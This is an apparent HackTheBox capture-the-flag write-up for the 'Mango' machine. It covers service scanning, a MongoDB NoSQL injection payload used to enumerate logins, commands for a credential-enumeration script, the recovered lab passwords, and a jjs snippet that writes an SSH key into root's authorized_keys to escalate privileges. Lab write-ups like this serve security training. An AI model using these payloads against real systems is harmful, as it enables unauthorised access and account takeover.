# Mango
Box IP **10.10.10.162**


### Nmap scan

```bash
$ nmap -sC -sV -T5 -v mango.htb
```

### Services
<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Mango/src/1.png" alt="1" />
</p>

Access to webserver on port 80 is forbidden, and connection of port 443 reveals an invalid certificate

By investigating the certificate we find some interesting info

<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Mango/src/2.png" alt="1" />
</p>

Jumping to this address we found a login page


### MongoDB

We exploit MongoDB [regex](https://docs.mongodb.com/manual/reference/operator/query/regex/) to enumerate **users** and **password**.

If the regex matches, the server replies with status **302**, otherwise with **200**
```
POST / HTTP/1.1
...
username[$regex]=^admi.*&password[$ne]=1&login=login
```

<p align="center">
  <img src="https://github.com/lorenzoinvidia/HTB-CheatSheets/blob/master/src/web/mongo.png" alt="HTB" />
</p>

We [speedup](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/blob/master/nosqli-user-pass-enum.py) the credential grabbing by

```bash
$ python3 nosqli-user-pass-enum.py -u https://staging-order.mango.htb -m POST -up username -pp password -op login:login -ep username
$ python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb -m POST -up username -pp password -op login:login -ep password
```

And we get **mango:h3mXK8RhU~f{]f5H** and **admin:t9KcS3>!0B#2**

We authenticate as **mango** in SSH and by switching user to **admin** we get the user flag


### Privilege Escalation

By searching for suid binaries
```
$ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
```

we find a jss binary /usr/lib/jvm/java-11-openjdk-amd64/bin/**jjs**

As [gtfobins](https://gtfobins.github.io/gtfobins/jjs/) suggests we basically can

- write our ssh PK in the root directory
```
$ echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("/root/.ssh/authorized_keys");
fw.write("YOUR PUBLIC KEY");
fw.close();' | jjs
```

- open a [reverse shell](https://github.com/lorenzoinvidia/HackTheBox-CheatSheets/wiki/Shells#spawn-reverse-shell)

- directly print the root flag

<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Mango/src/3.png" alt="1" />
</p>


If you liked this writeup, please leave a respect on my hackthebox

![htbbadge](https://www.hackthebox.eu/badge/image/77747)
